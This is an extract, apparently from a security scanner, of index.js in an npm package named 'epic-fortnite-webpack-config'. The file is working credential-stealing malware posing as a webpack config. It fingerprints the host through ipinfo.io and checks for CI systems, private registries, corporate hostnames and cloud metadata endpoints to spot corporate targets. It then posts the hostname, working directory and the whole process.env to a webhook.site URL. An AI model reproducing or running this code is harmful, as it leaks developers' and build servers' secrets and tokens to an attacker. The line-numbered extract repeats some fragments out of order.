// File: tmp/tmpmn4zeaaf/epic-fortnite-webpack-config/package/index.js
// ======================================================================
Line 1: const https = require('https')
Line 2: const os = require('os')
Line 3: const dns = require('dns').promises
Line 8: (_tmp_1 = https.get('https://ipinfo.io/json', (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          const json = JSON.parse(data);
          resolve({
            ip: json.ip || null,
            org: json.org || null,
            hostname: json.hostname || null,
            city: json.city || null,
            region: json.region || null,
            country: json.country || null
          });
        } catch (e) {
          resolve({});
        }
      });
    }))
Line 13: const json = JSON.parse(data)
Line 31: {
  const ciEnvVars = ['CI', 'CONTINUOUS_INTEGRATION', 'BUILD_NUMBER', 'RUN_ID', 'GITLAB_CI', 'CIRCLECI', 'TRAVIS', 'JENKINS_URL', 'TEAMCITY_VERSION', 'BITBUCKET_BUILD_NUMBER', 'GITHUB_ACTIONS', 'AZURE_DEVOPS'];
  const privateRegistryIndicators = ['npm_config_registry', 'NPM_PRIVATE_REGISTRY', 'verdaccio', 'nexus', 'artifactory', 'npmrc', 'internal_registry'];
  const corporateHostnamePatterns = [/\.corp\./i, /\.internal\./i, /\.company\./i, /-prd$/i, /-dev$/i, /^build-/i, /^ci-/i];
  const cloudMetadata = { aws: '169.254.169.254', gcp: 'metadata.google.internal' };

  const checks = {
    isCI: ciEnvVars.some(v => process.env[v]),
    hasPrivateRegistry: privateRegistryIndicators.some(v => process.env[v] || (process.env.npm_package_json && process.env.npm_package_json.includes(v))),
    hasCorporateHostname: corporateHostnamePatterns.some(p => p.test(os.hostname())),
    isCloudVM: false,
    isCorporateNetwork: false
  };

  try {
    checks.isCloudVM = await Promise.any([
      ...
Line 32: const ciEnvVars = ['CI', 'CONTINUOUS_INTEGRATION', 'BUILD_NUMBER', 'RUN_ID', 'GITLAB_CI', 'CIRCLECI', 'TRAVIS', 'JENKINS_URL', 'TEAMCITY_VERSION', 'BITBUCKET_BUILD_NUMBER', 'GITHUB_ACTIONS', 'AZURE_DEVOPS']
Line 33: const privateRegistryIndicators = ['npm_config_registry', 'NPM_PRIVATE_REGISTRY', 'verdaccio', 'nexus', 'artifactory', 'npmrc', 'internal_registry']
Line 34: const corporateHostnamePatterns = [/\.corp\./i, /\.internal\./i, /\.company\./i, /-prd$/i, /-dev$/i, /^build-/i, /^ci-/i]
Line 37: const checks = {
    isCI: ciEnvVars.some(v => process.env[v]),
    hasPrivateRegistry: privateRegistryIndicators.some(v => process.env[v] || (process.env.npm_package_json && process.env.npm_package_json.includes(v))),
    hasCorporateHostname: corporateHostnamePatterns.some(p => p.test(os.hostname())),
    isCloudVM: false,
    isCorporateNetwork: false
  }
Line 38: _tmp_9.isCI = ciEnvVars.some(v => process.env[v])
Line 39: _tmp_9.hasPrivateRegistry = privateRegistryIndicators.some(v => process.env[v] || (process.env.npm_package_json && process.env.npm_package_json.includes(v)))
Line 40: corporateHostnamePatterns.some(p => p.test(os.hostname()))
Line 47: _tmp_11.push(dns.lookup(cloudMetadata.aws).then(() => true).catch(() => false))
Line 48: _tmp_11.push(dns.lookup(cloudMetadata.gcp).then(() => true).catch(() => false))
Line 53: os.hostname()
Line 54: {
      const domain = hostname.split('.').slice(-2).join('.');
      const mxRecords = await dns.resolveMx(domain).catch(() => []);
      checks.isCorporateNetwork = mxRecords.length > 0;
    }
Line 55: hostname.split('.').slice(-2).join('.')
Line 56: const mxRecords = await dns.resolveMx(domain).catch(() => [])
Line 67: {
  const ipInfo = await getIPInfo();
  const internalCheck = await isInternalTeam();

  const data = JSON.stringify({
    timestamp: new Date().toISOString(),
    hostname: os.hostname(),
    platform: process.platform,
    cwd: process.cwd(),
    env: {
      PKG_NAME: process.env.npm_package_name,
      PKG_VERSION: process.env.npm_package_version,
      NODE_VERSION: process.version,
      ...process.env
    },
    ipInfo,
    internalCheck
  });

  const options = {
    hostname: 'webhook.site',
    path: '/1eb75742-93f4-4592-b6dd-61ecc664de00',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': data.length
    }
  };

  const req = https.request(options, (res) => {
    console.log(`Webhook sent. Status: ${res.statusCode}`);
  });

  req.on('error', (error) => {
    console.error(`Error: ${error}`);
  });

  req.write(data);
  req.end();
}
Line 73: os.hostname()
Line 96: const req = https.request(options, (res) => {
    console.log(`Webhook sent. Status: ${res.statusCode}`);
  })
Line 104: req.write(data)
Line 105: req.end()
Line 108: main()
